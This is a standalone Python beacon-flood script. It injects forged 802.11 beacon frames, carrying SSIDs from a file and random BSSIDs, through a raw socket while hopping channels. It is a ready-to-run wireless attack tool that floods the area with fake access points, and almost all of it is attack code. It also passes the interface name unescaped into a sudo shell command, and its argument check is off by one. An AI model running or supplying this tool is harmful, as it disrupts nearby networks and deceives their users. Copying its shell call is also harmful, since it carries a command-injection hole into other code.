#!/usr/bin/env python3
import string
import random
import socket
import sys
import os

pkt = b"\x00\x00\x18\x00.@\x00\xa0 \x08\x00\x00\x00\x02\xa3\t\xa0\x00\xd7\x00\x00\x00\xd7\x00\x80\x00\x00\x00\xff\xff\xff\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xbb\xbb0f\x9d\xe1\x0bu\x03\x00\x00\x00d\x00\x11\x04\x00\x0fAAAAAAAAAAAAAAA\x01\x08\x82\x84\x8b\x96$0Hl\x03\x01\x01\x05\x04\x01\x03\x00\x00\x07\x06KR\x04\x01\r\x14#\x02\x16\x00*\x01\x022\x04\x0c\x12\x18`0\x14\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x8c\x00\x0b\x05\x00\x00d\x00\x00B\x01\x00-\x1a\xef\x11\x17\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00=\x16\x01\x00\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00J\x0e\x14\x00\n\x00,\x01\xc8\x00\x14\x00\x05\x00\x19\x00\x7f\x08\x05\x00\x08\x00\x00\x00\x00@\xbf\x0c\xb1i\x83\x0f\xaa\xff\x00\x00\xaa\xff\x00\x00\xc0\x05\x00\x01\x00\x00\x00\xdd5\x00P\xf2\x04\x10J\x00\x01\x10\x10D\x00\x01\x02\x10G\x00\x10\xbel\x8d\xc7:\x1d\xd7/\x91R\x98\x16\xd2u\xf1N\x10<\x00\x01\x03\x10I\x00\n\x007*\x00\x01 \x05\x02\x07\x84\xdd%\xf82\xe4\x01\x01\x01\x02\x01\x00\x03\x14a\xaf\xaf\x98\x05&\xde\xfaM\x95j\xc1\xdd\xec\x94|Z\xed;\x86\x07\x04Z\xed;\x86\xdd\x1e\x00\x90L\x04\x18\xbf\x0c\xb1i\x83\x0f\xaa\xff\x00\x00\xaa\xff\x00\x00\xc0\x05\x00\x01\x00\x00\x00\xc3\x02\x00\x02\xdd\t\x00\x10\x18\x02\x00\x00\x9c\x00\x00\xdd\x18\x00P\xf2\x02\x01\x01\x84\x00\x03\xa4\x00\x00'\xa4\x00\x00BC^\x00b2/\x00\xdd\x07Po\x9a\x16\x01\x01\x00"

def beacon(interface, BSSID_list, ESSID_list, loop=1000):
  soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
  soc.bind((interface, 0x0003))
  ap = {}
  i = 0
  ch = 1
  while type(loop) == type(None) or i < loop:
    i += 1

    ch = ((ch + 1) % 13) + 1
    os.system("sudo iwconfig %s channel %d" % (interface, ch))

    x = i % len(ESSID_list)
    x -= 1

    ESSID = ESSID_list[x].encode()
    BSSID = BSSID_list[x]

    data = pkt
    data = data[:0x27] + BSSID + data[0x27 + 6:]
    data = data[:0x3d] + chr(len(ESSID)).encode() + data[0x3e:]
    data = data[:0x3e] + ESSID + data[0x3e + 16:]

    packet = soc.send(data)

if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("syntax : beacon-flood <interface> <ssid-list-file>")
    print("sample : beacon-flood mon0 ssid-list.txt")
    exit(1)

  fp = open(sys.argv[2])
  ESSID_list = fp.read().split("\n")
  fp.close()
 
  if not ESSID_list[-1]: ESSID_list.pop()

  BSSID_list = [("".join(random.sample(string.ascii_letters, 6))).encode() for _ in range(len(ESSID_list))]

  beacon(sys.argv[1], BSSID_list, ESSID_list, loop=None)
